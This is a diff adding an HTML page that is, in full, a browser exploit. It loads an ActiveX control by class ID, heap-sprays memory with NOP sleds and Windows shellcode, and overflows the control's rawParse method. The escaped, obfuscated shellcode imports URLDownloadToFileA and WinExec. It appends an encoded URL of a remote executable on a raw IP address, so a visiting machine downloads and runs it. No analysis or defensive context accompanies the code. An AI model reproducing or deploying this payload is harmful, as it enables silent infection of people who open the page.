@@ -1,0 +1,33 @@
+<html>
+<object classid="clsid:6BE52E1D-E586-474f-A6E2-1A85A9B4D9FB" id='ALDWM'></object>
+<body>
+<script>
+var ALDWMQQ = "QQ200860551";
+var ALDWMbf0 = "%u7468%u7074%u2f3a%u322f%u3232%u372e%u2e37%u3731%u2e39%u3132%u2f31%u3337%u2f31%u3337%u2e31%u7865%u0065";
+var ALDWMbf1 = "%u9090%u9090";
+var ALDWMbf2 = "%uC683";
+
+var shellcode = unescape("%u9090%u9090%uEFE9%u0000%u5A00%uA164%u0030%u0000%u408B%u8B0C%u1C70%u8BAD%u0840%uD88B%u738B%u8B3C%u1E74%u0378%u8BF3%u207E%uFB03%u4E8B%u3314%u56ED%u5157%u3F8B%uFB03%uF28B%u0E6A%uF359%u74A6%u5908%u835F%u04C7%uE245%u59E9%u5E5F%uCD8B%u468B%u0324%uD1C3%u03E1%u33C1%u66C9%u088B%u468B%u031C%uC1C3%u02E1%uC103%u008B%uC303%uFA8B%uF78B"+bf2+"%u8B0E%u6AD0%u5904%u6AE8%u0000%u8300%u0DC6%u5652%u57FF%u5AFC%uD88B%u016A%uE859%u0057%u0000%uC683%u5613%u8046%u803E%uFA75%u3680%u5E80%uEC83%u8B40%uC7DC%u6303%u646D%u4320%u4343%u6643%u03C7%u632F%u4343%u03C6%u4320%u206A%uFF53%uEC57%u04C7%u5C03%u2E61%uC765%u0344%u7804%u0065%u3300%u50C0%u5350%u5056%u57FF%u8BFC%u6ADC%u5300%u57FF%u68F0%u2451%u0040%uFF58%u33D0%uACC0%uC085%uF975%u5251%u5356%uD2FF%u595A%uE2AB%u33EE%uC3C0%u0CE8%uFFFF%u47FF%u7465%u7250%u636F%u6441%u7264%u7365%u0073%u6547%u5374%u7379%u6574%u446D%u7269%u6365%u6F74%u7972%u0041%u6957%u456E%u6578%u0063%u7845%u7469%u6854%u6572%u6461%u4C00%u616F%u4C64%u6269%u6172%u7972%u0041%u7275%u6D6C%u6E6F%u5500%u4C52%u6F44%u6E77%u6F6C%u6461%u6F54%u6946%u656C%u0041" + ALDWMbf0);
+</script>
+<SCRIPT language="javascript">
+var bigblock = unescape(ALDWMbf1);
+var headersize = 20;
+var slackspace = headersize+0+shellcode.length;
+while (bigblock.length<slackspace) bigblock+=bigblock;
+fillblock = bigblock.substring(0, slackspace);
+block = bigblock.substring(0, bigblock.length-slackspace);
+while(block.length+slackspace<0x40000) block = block+block+fillblock;
+memory = new Array();
+for (x=0; x<300; x++) memory[x] = block + shellcode;
+var buffer = '';
+while (buffer.length < 4057) buffer+='\x0a\x0a\x0a\x0a';
+buffer+='\x0a';
+buffer+='\x0a';
+buffer+='\x0a';
+buffer+='\x0a\x0a\x0a\x0a';
+buffer+='\x0a\x0a\x0a\x0a';
+var ALDWM1 = ALDWM;
+ALDWM1.rawParse(buffer);
+</script>
+</body>
+</html>
